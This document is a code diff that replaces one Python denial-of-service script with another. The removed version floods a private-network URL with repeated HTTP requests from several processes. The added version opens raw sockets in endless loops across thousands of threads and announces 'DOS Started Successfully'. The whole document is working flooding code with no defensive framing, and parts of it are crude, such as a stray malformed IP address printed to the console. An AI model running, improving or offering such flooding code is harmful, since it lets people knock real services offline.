@@ -1,41 +1,30 @@
-import requests
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
-# import threading
-import multiprocessing
-import signal
+import socket
+import threading
+import random
+import sys, errno
 
-url = 'http://10.30.40.181/gv_shout'
 
-def handler(signum, frame):
-  print("Killing attack", end="", flush=True)
-  exit(1)
-  
-def crasher():
-  retry = Retry(connect=3, backoff_factor=0.5)
-  adapter = HTTPAdapter(max_retries=retry)
+target = socket.gethostbyname(socket.gethostname()) 
+ip = 'localhost' #change to mask id 
+port = 80
+print("http://151.30.04.1/")
+print("DOS Started Successfully")
+def attack():
+  while 0<1:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((target, port))
+      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+      s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
+      
+      s.close()
+    # except IOError as e:
+    #   if e.errno == errno.EPIPE:
+	   #    pass
 
-  while True:
-    session = requests.Session()
-    session.mount('http://', adapter)
-    # session.mount('https://', adapter)
-
-    session.get(url)
-    session.close()
-    print("got site")
-
-def multiThreadCrasher(threadCount):
-  processes = []
-
-  signal.signal(signal.SIGINT, handler)
-
-  for i in range(threadCount):
-    # threads.append(threading.Thread(target=crasher,name=i))
-    processes.append(multiprocessing.Process(target=crasher,name="{}".format(i)))
-
-  for i in range(len(processes)):
-    processes[i].start()
-    # processes[i].join()
-
-if __name__ == "__main__":
-  multiThreadCrasher(2)
+i = 0
+while (i<2000):
+    thread = threading.Thread(target=attack)
+    thread.start()
+    i+=1
+    if (i > 1950):
+      i = 0
